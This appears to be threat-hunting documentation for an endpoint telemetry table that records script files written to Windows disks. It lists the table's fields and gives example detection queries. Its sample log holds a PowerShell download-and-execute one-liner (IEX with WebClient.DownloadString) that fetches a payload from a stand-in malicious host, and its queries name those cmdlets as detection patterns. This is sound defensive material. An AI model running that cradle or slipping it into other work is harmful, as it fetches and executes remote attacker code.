## ScriptFileWrittenInfo Table: Script File Content Event

### 1. Table Name
**ScriptFileWrittenInfo**

---

### 2. Table Usage
This event provides the full content of a script file that was written to disk on a Windows host. Attackers frequently drop malicious scripts (e.g., PowerShell, VBScript, Batch files) onto a system to download further malware, establish persistence, or perform reconnaissance. Capturing the full script content is invaluable for threat hunting and incident response, as it allows for immediate analysis of the script's intent and capabilities.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The full path and file name where the script was written. | Windows Only |
| FileFormatString | The detected format of the script file (e.g., "PowerShell", "VBScript", "Batch"). | Windows Only |
| ScriptContent | The full text content of the script that was written to the file. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\admin\\AppData\\Local\\Temp\\update.ps1",
  "FileFormatString": "PowerShell",
  "ScriptContent": "IEX(New-Object Net.WebClient).DownloadString('[http://malicious.domain/payload.exe](http://malicious.domain/payload.exe)')"
}
```

---
### 5. Example Queries

```xql
// Find all instances of script files being written
event_simpleName=ScriptFileWrittenInfo

// Hunt for PowerShell scripts written to disk
event_simpleName=ScriptFileWrittenInfo FileFormatString="PowerShell"

// Find scripts written to a temporary or user-profile directory
event_simpleName=ScriptFileWrittenInfo TargetFileName="*\\Temp\\*" OR TargetFileName="*\\AppData\\*"

// Search for specific suspicious commands within the script content
event_simpleName=ScriptFileWrittenInfo ScriptContent="*DownloadString*" OR ScriptContent="*Invoke-Expression*" OR ScriptContent="*IEX*"

// Find potentially malicious VBScripts being dropped
event_simpleName=ScriptFileWrittenInfo TargetFileName="*.vbs" ScriptContent="*CreateObject*"
```
---
